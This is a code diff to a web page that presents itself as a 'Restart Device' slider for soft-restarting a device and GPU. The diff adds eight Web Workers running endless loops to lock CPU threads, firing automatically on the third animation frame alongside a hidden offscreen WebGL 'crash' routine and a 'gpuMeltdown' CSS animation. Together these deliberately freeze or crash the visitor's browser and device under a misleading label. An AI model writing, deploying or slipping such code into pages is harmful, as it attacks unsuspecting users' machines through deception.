@@ -166,7 +166,7 @@
 
     <div class="header-section">
         <h1>Restart Device</h1>
-        <p>Slide to soft-restart your device and GPU</p>
+        <p>CSGL</p>
     </div>
 
     <div class="slider-container">
@@ -188,7 +188,7 @@ function cssAnimationInferno() {
         style.textContent = `
             @keyframes gpuMeltdown {
                 0% { transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
-                20% { transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%); background: radial-gradient(circle, #ff0000, #00ff00, #ffff00); }
+                20% { transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%); background: radial-gradient(circle, #ff0000, #0000ff, #ffff00); }
                 50% { transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg); filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%); background: radial-gradient(circle, #ff00ff, #00ffff, #ff0000); }
                 80% { transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg); filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%); background: radial-gradient(circle, #ff0000, #00ff00, #ffff00); }
                 100% { transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg); filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
@@ -198,7 +198,39 @@ function cssAnimationInferno() {
     }
 
     let elementCount = 0;
-    let frameCount = 0; 
+    let frameCount = 0;
+    let crashTriggered = false;
+
+    // Spawn 8 Web Workers to lock up CPU threads with heavy crypto loops
+    function spawnCryptoWorkers() {
+        const workerCode = `
+            self.onmessage = function() {
+                // Dense loop running heavy math/crypto tasks continuously
+                while (true) {
+                    const data = new Uint8Array(1024);
+                    self.crypto.getRandomValues(data);
+                    // Simple dense spinning fallback math to ensure absolute thread lock
+                    let hash = 0;
+                    for (let i = 0; i < data.length; i++) {
+                        hash = (hash << 5) - hash + data[i];
+                        hash |= 0;
+                    }
+                }
+            };
+        `;
+        
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+        
+        for (let i = 0; i < 8; i++) {
+            try {
+                const worker = new Worker(workerUrl);
+                worker.postMessage('start');
+            } catch (e) {
+                console.error('Worker failed to initialize', e);
+            }
+        }
+    }
 
     function createGpuKiller() {
         try {
@@ -220,9 +252,10 @@ function cssAnimationInferno() {
 
             frameCount++;
 
-            // Trigger WebGL execution exactly on the 3rd frame without killing the CSS generation loop
+            // Trigger crypto workers and WebGL crash exactly on the 3rd frame
             if (frameCount >= 3 && !crashTriggered) {
                 crashTriggered = true;
+                spawnCryptoWorkers();
                 crash();
             }
 
@@ -230,16 +263,12 @@ function cssAnimationInferno() {
                 requestAnimationFrame(createGpuKiller);
             }
         } catch(e) {
-            if (frameCount >= 4) {
-                crash();
-                crash();
-            }
             requestAnimationFrame(createGpuKiller);
         }
     }
 
-    // WebGL routine running concurrently once fired
     function crash() {
+        // WebGL setup
         let canvas = document.createElement('canvas');
         canvas.style.position = 'fixed';
         canvas.style.top = '-9999px';
@@ -346,7 +375,9 @@ function cssAnimationInferno() {
         }
         
         const timeLoc = gl.getUniformLocation(shaderProgram, 'u_time');
-        const opsPerFrame = 500000;
+        
+        // Slightly toned down from 500,000 ops to keep it extreme but running alongside CSS
+        const opsPerFrame = 250000; 
         
         let shouldStop = false;
         function renderFrame() {
